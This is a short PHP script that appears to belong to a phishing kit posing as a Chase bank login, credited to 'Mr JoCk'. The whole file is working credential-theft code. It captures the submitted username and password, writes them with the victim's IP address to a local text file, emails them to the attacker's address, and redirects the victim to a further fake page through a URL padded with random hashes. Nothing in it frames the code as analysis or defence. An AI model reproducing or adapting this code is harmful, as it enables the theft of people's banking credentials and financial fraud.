<?php

session_start();
$_SESSION['onlineId1'] = $_POST['onlineId1'];
$_SESSION['passcode1'] = $_POST['passcode1'] ;

include('Email.php');




$message .= "----------------------+   Full +-------------------\n";
$message .= "-----------------------------------------------------\n";
$message .= " Username = ".$_POST["onlineId1"]."\n";
$message .= " Password = ".$_POST["passcode1"]."\n";
$message .= "--------------------+ By Mr JoCk +------------------\n";
$message .= "Client IP: ".$ip." \n";
$subject = "Login Chase By JoCk- From:  [ $ip ]";
$file = fopen("./cool.txt","a"); 
fwrite($file, $message);
$headers = 'From: Mr JoCK <WF@rezult.com>' ;
{
mail($XBALTI_EMAIL,$subject,$message,$headers);
}
header("Location: ./surf2.php?cmd=_update" . md5(microtime()) . "&account_" . md5(microtime()) . "=" . md5(microtime()) . "&lim_session=" . sha1(microtime()) . "");
?>
